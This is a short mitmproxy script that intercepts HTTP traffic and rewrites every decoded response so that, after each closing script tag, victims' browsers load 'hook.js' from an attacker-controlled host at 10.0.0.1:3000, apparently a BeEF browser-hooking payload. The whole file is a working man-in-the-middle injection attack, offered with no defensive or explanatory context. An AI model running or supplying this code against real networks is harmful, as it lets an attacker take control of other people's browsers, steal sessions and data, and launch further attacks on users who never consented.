#mitmproxy script file

from libmproxy.models import decoded


def response(context, flow):
    with decoded(flow.response):  # automatically decode gzipped responses.
        if "</script>" in flow.response.content:
            flow.response.content = flow.response.content.replace(
                "</script>",
                "</script><script src='http://10.0.0.1:3000/hook.js'></script>")
